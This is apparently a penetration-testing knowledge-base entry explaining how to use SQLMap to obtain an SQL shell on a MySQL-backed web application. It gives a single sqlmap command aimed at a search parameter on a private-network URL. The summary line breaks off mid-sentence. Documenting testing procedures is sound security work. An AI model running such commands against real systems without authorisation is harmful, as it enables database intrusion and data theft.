---
id: 96914eb5-e1f4-4040-b83a-04a12cecc0e9
name: Using SQLMap to Get SQL Shell
type: procedure
verified: true
submitted: true
created_at: '2020-08-19T19:16:15.185646+00:00'
updated_at: '2023-05-26T01:26:54.762850+00:00'
platforms:
- Web
tags:
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[SQL]]'
- '[[sqli]]'
- '[[SQL Injection]]'
- '[[SQLMap]]'
- '[[Web Applications]]'
commands:
- '[[SQLMap Command to Get SQL Shell]]'
---

# Using SQLMap to Get SQL Shell

**Status**: ✓ Verified

## Summary

SQLMap is an automated SQL Injection exploitation tool. This can be used to insert the SQL injection payloads through the application input fields. It is also possible to obtain the SQL shell by running the SQLMap tool. --dbms is used to specify the database type, --sql-shell to specify the access 

## Description

# Description

SQLMap is an automated SQL Injection exploitation tool. This can be used to insert the SQL injection payloads through the application input fields. It is also possible to obtain the SQL shell by running the SQLMap tool.

*--dbms is used to specify the database type, --sql-shell to specify the access for SQL Shell*



# Procedure

1. The below SQL command can be used to get the SQL shell of the database.







**Command** ([[SQLMap Command to Get SQL Shell]]):

```bash
sqlmap --dbms=mysql -u '192.168.43.68/vcart/search.php?term=' --sql-shell
```





## Platforms

- Web

## Commands Used

- [[SQLMap Command to Get SQL Shell]]

## Tags

- [[owasp]]
- [[owasp top 10]]
- [[SQL]]
- [[sqli]]
- [[SQL Injection]]
- [[SQLMap]]
- [[Web Applications]]


